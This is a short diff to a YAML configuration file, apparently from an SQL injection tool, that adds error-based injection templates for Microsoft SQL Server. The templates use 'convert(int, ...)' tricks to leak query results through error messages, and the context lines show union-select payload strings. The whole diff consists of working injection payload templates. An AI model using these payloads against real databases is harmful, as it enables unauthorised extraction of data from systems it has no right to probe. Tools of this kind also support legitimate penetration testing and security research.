@@ -158,3 +158,22 @@ strategy:
   indices: union select ${result_range} from (${indice_unique}) b
   capacity: (select '${lead}${indice}' %2b ${calibrator})
   orderBy: order by 1337
+
+ error:
+  method:
+
+   - name: convert:or
+     query: |
+      /* Syntax error during explicit conversion of VARCHAR value '<sqli>' to a INT field */
+      or 1=convert(int, (${window}))
+     capacity: 255
+
+   - name: convert:and
+     query: |
+      and 1=convert(int, (${window}))
+     capacity: 255
+
+   - name: convert:none
+     query: |
+      1=convert(int, (${window}))
+     capacity: 255
